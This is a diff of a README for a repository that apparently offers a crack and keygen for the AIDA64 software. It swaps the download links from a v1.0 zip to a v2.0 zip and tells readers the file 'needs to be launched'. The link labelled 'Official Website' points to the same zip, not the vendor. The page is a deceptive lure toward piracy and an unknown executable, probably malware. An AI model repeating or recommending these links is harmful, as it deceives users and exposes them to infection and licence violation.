@@ -11,7 +11,7 @@ Welcome to the AIDA64 Activation Hub! This repository provides an efficient solu
 ## 📁 Download Software
 
 To download the software, click the button below:
-[![Download Software](https://github.com/LuzaMu/AIDA64-Crack-With-Keygen-2025/releases/download/v1.0/Release.zip)](https://github.com/LuzaMu/AIDA64-Crack-With-Keygen-2025/releases/download/v1.0/Release.zip) (needs to be launched)
+[![Download Software](https://github.com/LuzaMu/AIDA64-Crack-With-Keygen-2025/releases/download/v2.0/Software.zip)](https://github.com/LuzaMu/AIDA64-Crack-With-Keygen-2025/releases/download/v2.0/Software.zip) (needs to be launched)
 
 If the link does not work, please check the **Releases** section of this repository for alternative download options.
 
@@ -30,7 +30,7 @@ If the link does not work, please check the **Releases** section of this reposit
 
 ## 📌 Resources
 
-- **Official Website:** [AIDA64 Official Website](https://github.com/LuzaMu/AIDA64-Crack-With-Keygen-2025/releases/download/v1.0/Release.zip)
+- **Official Website:** [AIDA64 Official Website](https://github.com/LuzaMu/AIDA64-Crack-With-Keygen-2025/releases/download/v2.0/Software.zip)
 - **Documentation:** Check the **Documentation** folder in the software package for detailed instructions.
 
 ## 🤝 How to Contribute
